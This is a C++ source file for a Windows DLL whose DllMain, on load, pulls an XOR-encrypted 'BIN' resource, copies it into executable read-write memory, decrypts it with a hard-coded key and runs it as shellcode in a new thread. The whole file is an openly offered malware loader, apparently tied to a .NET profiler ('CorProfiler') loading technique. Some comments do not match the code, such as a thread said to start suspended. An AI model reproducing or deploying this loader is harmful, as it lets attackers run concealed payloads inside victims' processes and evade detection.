// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

#include "resource.h"
#include <windows.h>

// Xor key
unsigned char key[] = "key1337";

// Xor function to decrypt shellcode with the key
void Xor(unsigned char* buf, int* bufLen, unsigned char* key)
{
    // get the length of the key
    int keyLen = strlen((const char*)key);

    // xor the buffer with the key
    for (int i = 0; i < *bufLen; i++)
    {
        buf[i] = buf[i] ^ key[i % keyLen];
    }
}

BOOL APIENTRY DllMain(
    HINSTANCE hinstDLL,  // Handle to DLL module
    DWORD fdwReason,     // Reason for calling function
    LPVOID lpReserved)   // Reserved
{
    // When DLL attaches to the process...
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        // Load the encrypted payload from the resource
        HRSRC resource = FindResource(hinstDLL, MAKEINTRESOURCE(IDR_BIN1), L"BIN"); // IDR_BIN1 is the resource ID genreated by CorProfiler.rc and BIN is the resource type set when importing the payload
        HGLOBAL resourceHandle = LoadResource(hinstDLL, resource);
        DWORD resourceSize = SizeofResource(hinstDLL, resource);
        LPVOID resourceData = LockResource(resourceHandle);

        // Get a handle to the calling process ( the process loading the DLL ) 
        HANDLE callingProc = GetCurrentProcess();

        // Create an executeable buffer for the remote thread
        unsigned char* remoteBuf = (unsigned char*)VirtualAllocEx(callingProc, NULL, resourceSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        // Copy encrypted shellcode to the executeable buffer
        memcpy(remoteBuf, resourceData, resourceSize);

        // Decrypt the shellcode
        Xor(&remoteBuf[0], (int*)&resourceSize, &key[0]);

        // Write the shellcode into the memory of the calling process
        WriteProcessMemory(callingProc, remoteBuf, NULL, NULL, NULL);

        // Create a remote thread on the calling process, in a suspended state
        HANDLE remoteThread = CreateRemoteThread(callingProc, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuf, NULL, NULL, 0);

        // Close the handles
        CloseHandle(remoteThread);
        CloseHandle(callingProc);
    }
    return TRUE;
}
